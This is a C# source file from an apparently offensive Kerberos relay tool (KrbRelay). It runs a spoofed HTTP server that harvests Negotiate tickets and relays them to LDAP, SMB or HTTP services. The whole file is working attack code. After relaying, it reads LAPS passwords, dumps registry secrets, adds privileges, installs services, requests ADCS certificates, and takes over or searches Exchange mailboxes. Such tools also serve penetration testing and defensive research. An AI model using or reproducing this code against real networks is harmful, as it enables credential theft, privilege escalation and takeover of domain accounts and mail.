using System;
using System.IO;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Net.Http;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

namespace KrbRelay.Spoofing
{
    internal class HttpRelayServer
    {
        //server
        public static HttpListener listener;
        public static string url = "";
        public static string service;
        public static int requestCount = 0;
        public static string pageData =
            "<!DOCTYPE>" +
            "<html>" +
            "  <head>" +
            "    <title>Hello World</title>" +
            "  </head>" +
            "</html>";


        //todo: replace httpListener with tcpListener

        public static void start(string Service, string argSpooferIP)
        {
            service = Service;
            url = "http://"+argSpooferIP+"/";

            //server
            listener = new HttpListener();
            listener.Prefixes.Add(url);
            listener.Start();
            Console.WriteLine("[*] Listening for connections on {0}", url);

            // Handle requests
            Task listenTask = HandleIncomingConnections();
            listenTask.GetAwaiter().GetResult();
        }

        public static async Task HandleIncomingConnections()
        {
            while (true)
            {
                // Will wait here until we hear from a connection
                HttpListenerContext ctx = await listener.GetContextAsync();

                // Peel out the requests and response objects
                HttpListenerRequest req = ctx.Request;
                HttpListenerResponse resp = ctx.Response;
                string ticket = "";

                // Print out some info about the request
                Console.WriteLine("[*] New Request #: {0}", ++requestCount);
                Console.WriteLine("Requested hostname: {0}", req.Url.ToString());
                Console.WriteLine("UserAgent: {0}", req.UserAgent);
                if (req.Headers.AllKeys.Contains("Authorization"))
                {
                    ticket = req.Headers.GetValues("Authorization")[0];
                    Console.WriteLine(ticket);
                }
                Console.WriteLine();

                string targetResp = "";
                if (service == "http")
                    targetResp = httpConnect(ticket);
                else if (!string.IsNullOrEmpty(ticket)){
                    if (service == "cifs")
                        targetResp = smbConnect(ticket);
                    else if (service == "ldap")
                        targetResp = ldapConnect(ticket);
                }
                else {
                    targetResp = "Negotiate";
                    //targetResp = "Kerberos";
                }

                // Write the response info
                byte[] data = Encoding.UTF8.GetBytes("Access denied");
                resp.ContentType = "text/html";
                resp.ContentEncoding = Encoding.UTF8;
                resp.ContentLength64 = data.LongLength;
                resp.AddHeader("WWW-Authenticate", targetResp);
                resp.StatusCode = (int)HttpStatusCode.Unauthorized;


                // Write out to the response stream (asynchronously), then close it
                await resp.OutputStream.WriteAsync(data, 0, data.Length);
                resp.Close();
            }
        }


        //clients
        public static string ldapConnect(string ticket)
        {
            Console.WriteLine("ldapclient");

            byte[] apReq = Convert.FromBase64String(ticket.Replace("Negotiate ", ""));

            var sTicket = new Natives.SecBuffer(apReq);
            var berval = new Natives.berval
            {
                bv_len = sTicket.cbBuffer,
                bv_val = sTicket.pvBuffer
            };
            var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
            Marshal.StructureToPtr(berval, bervalPtr, false);
            var bind = Natives.ldap_sasl_bind(
                Program.ld,
                "",
                "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
                bervalPtr,
                IntPtr.Zero,
                IntPtr.Zero,
                out IntPtr servresp);
            Console.WriteLine("[*] bind: {0}", bind);
            Natives.ldap_get_option(Program.ld, 0x0031, out int value);
            Console.WriteLine("[*] ldap_get_option: {0}", (Natives.LdapStatus)value);
            if ((Natives.LdapStatus)value == Natives.LdapStatus.LDAP_SUCCESS)
            {
                Console.WriteLine("[+] LDAP session established");
                Clients.Attacks.Ldap.LAPS.read(Program.ld, "");
            }

            //return string.Format("Negotiate {0}", Convert.ToBase64String(resp));
            return "";
        }
        public static string smbConnect(string ticket)
        {
            byte[] apReq = Convert.FromBase64String(ticket.Replace("Negotiate ", ""));
            byte[] resp = Program.smbClient.Login(apReq, out bool success);
            if (success)
            {
                Console.WriteLine("[+] SMB session established");
                //Program.stopSpoofing = true;

                try
                {
                    if (Program.attacks.Keys.Contains("console"))
                    {
                        Clients.Attacks.Smb.Shares.smbConsole(Program.smbClient);
                    }
                    if (Program.attacks.Keys.Contains("list"))
                    {
                        Clients.Attacks.Smb.Shares.listShares(Program.smbClient);
                    }
                    if (Program.attacks.Keys.Contains("add-privileges"))
                    {
                        Clients.Attacks.Smb.LSA.AddAccountRights(Program.smbClient, Program.attacks["add-privileges"]);
                    }
                    if (Program.attacks.Keys.Contains("secrets"))
                    {
                        Clients.Attacks.Smb.RemoteRegistry.secretsDump(Program.smbClient, false);
                    }
                    if (Program.attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = Program.attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = Program.attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                        Clients.Attacks.Smb.ServiceManager.serviceInstall(Program.smbClient, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                //Environment.Exit(0);
            }

            return string.Format("Negotiate {0}", Convert.ToBase64String(resp));
        }
        public static string httpConnect(string ticket)
        {
            string endpoint = "/";
            if (!string.IsNullOrEmpty(Program.attacks["endpoint"]))
            {
                endpoint = Program.attacks["endpoint"].TrimStart('/');
            }

            HttpResponseMessage result;
            using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
            {
                if (!string.IsNullOrEmpty(ticket))
                    message.Headers.Add("Authorization", ticket);

                message.Headers.Add("Connection", "keep-alive");
                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                result = Program.httpClient.SendAsync(message).Result;
            }

            if (result.StatusCode != HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("[+] HTTP session established");
                //Program.stopSpoofing = true;

                //Kerberos auth may not require set-cookies
                IEnumerable<string> cookies = null;
                foreach (var h in result.Headers)
                {
                    if (h.Key == "Set-Cookie")
                    {
                        cookies = h.Value;
                        Console.WriteLine("[*] Authentication Cookie;\n" + string.Join(";", h.Value));
                    }
                }

                try
                {
                    if (Program.attacks.Keys.Contains("proxy"))
                    {
                        Clients.Attacks.Http.ProxyServer.Start(Program.httpClient, Program.httpClient.BaseAddress.ToString());
                    }

                    if (Program.attacks.Keys.Contains("adcs"))
                    {
                        Clients.Attacks.Http.ADCS.requestCertificate(Program.httpClient, Program.relayedUser, Program.relayedUserDomain, Program.attacks["adcs"]);
                    }

                    if (Program.attacks.Keys.Contains("ews-delegate"))
                    {
                        Clients.Attacks.Http.EWS.delegateMailbox(Program.httpClient, Program.relayedUser, Program.attacks["ews-delegate"]);
                    }

                    if (Program.attacks.Keys.Contains("ews-search"))
                    {
                        Clients.Attacks.Http.EWS.readMailbox(Program.httpClient, "inbox", Program.attacks["ews-search"]);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                //Environment.Exit(0);
            }
            else
            {
                foreach (var header in result.Headers)
                {
                    if (header.Key == "WWW-Authenticate")
                    {
                        Console.WriteLine("[*] WWW-Authenticate: {0}", header.Value.First());
                        return header.Value.First();
                    }
                }
            }
            return "";
        }
    }
}
